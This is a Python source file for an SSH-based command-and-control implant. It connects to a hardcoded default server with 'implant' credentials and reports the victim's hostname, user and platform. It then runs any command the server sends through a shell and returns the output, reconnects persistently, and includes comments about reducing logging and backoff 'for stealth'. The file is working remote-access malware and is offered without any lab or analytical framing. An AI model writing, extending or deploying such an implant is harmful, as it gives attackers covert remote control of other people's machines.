import paramiko
import subprocess
import os
import sys
import shlex
import socket
import getpass
import time
import logging
import argparse
import platform
from typing import Optional, Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.ERROR,  # Set to ERROR to be stealthier, INFO for debugging
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Client')


class C2Client:
    """C2 Client implementation using SSH for command and control"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.session = None
        self.reconnect_delay = 5  # seconds between reconnection attempts
        self.system_info = self._gather_system_info()
    
    def _gather_system_info(self) -> Dict[str, str]:
        """Gather basic system information"""
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine()
        }
        return info
    
    def connect(self) -> bool:
        """Establish connection to the C2 server"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'], 
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            
            self.session = self.ssh_client.get_transport().open_session()
            if self.session.active:
                # Send system information to server
                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']} ({self.system_info['platform']} {self.system_info['architecture']})"
                self.session.send(client_info)
                # Wait for acknowledgment
                self.session.recv(1024)
                logger.info("Successfully connected to C2 server")
                return True
            else:
                logger.error("Failed to establish active session")
                return False
                
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """Execute a command and return the output"""
        try:
            # Handle special commands
            if command == "exit":
                self.disconnect()
                sys.exit(0)
                
            elif command.startswith("cd "):
                # Change directory command
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return os.getcwd()
                except Exception as e:
                    return f"Error: {str(e)}"
                    
            elif command.startswith("download "):
                # Placeholder for file download functionality
                return "File download functionality not implemented yet"
                
            elif command.startswith("upload "):
                # Placeholder for file upload functionality
                return "File upload functionality not implemented yet"
                
            # Execute system command
            output = subprocess.check_output(
                shlex.split(command), 
                stderr=subprocess.STDOUT,
                shell=True,  # More secure to use False
                timeout=30
            )
            return output.decode('utf-8', errors='replace')
            
        except subprocess.CalledProcessError as e:
            return f"Command execution error: {e.output.decode('utf-8', errors='replace')}"
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def command_loop(self):
        """Main command processing loop"""
        while True:
            try:
                if not self.session or not self.session.active:
                    logger.info("Session no longer active, attempting to reconnect")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)
                    if not self.connect():
                        time.sleep(self.reconnect_delay)
                        continue
                
                # Wait for command
                command = self.session.recv(1024).decode().strip()
                if not command:
                    continue
                    
                logger.debug(f"Received command: {command}")
                
                # Execute command and send response
                output = self.execute_command(command)
                self.session.send(output)
                
            except KeyboardInterrupt:
                logger.info("Keyboard interrupt received, exiting")
                break
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                time.sleep(self.reconnect_delay)
                self.reconnect()
    
    def disconnect(self):
        """Clean up and disconnect"""
        if self.session:
            try:
                self.session.close()
            except:
                pass
        
        if self.ssh_client:
            try:
                self.ssh_client.close()
            except:
                pass
            
        self.session = None
        self.ssh_client = None
    
    def reconnect(self):
        """Handle reconnection logic"""
        self.disconnect()
        while not self.connect():
            logger.info(f"Reconnection failed, retrying in {self.reconnect_delay} seconds")
            time.sleep(self.reconnect_delay)
            # Implement exponential backoff for stealth
            self.reconnect_delay = min(300, self.reconnect_delay * 1.5)
    
    def run(self):
        """Main entry point for client operation"""
        try:
            if self.connect():
                self.command_loop()
            else:
                logger.error("Initial connection failed")
        except Exception as e:
            logger.error(f"Runtime error: {e}")
        finally:
            self.disconnect()


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
    parser.add_argument("--username", default="implant", help="Authentication username")
    parser.add_argument("--password", default="implant", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main():
    """Main entry point"""
    # Parse arguments but don't show them in help output for stealth
    try:
        args = parse_arguments()
        
        # Configure logging level
        if args.debug:
            logger.setLevel(logging.DEBUG)
        
        config = {
            'server_ip': args.server,
            'server_port': args.port,
            'username': args.username,
            'password': args.password
        }
        
        client = C2Client(config)
        client.run()
        
    except Exception as e:
        # Suppress error messages in production
        logger.error(f"Error: {e}")


if __name__ == '__main__':
    main()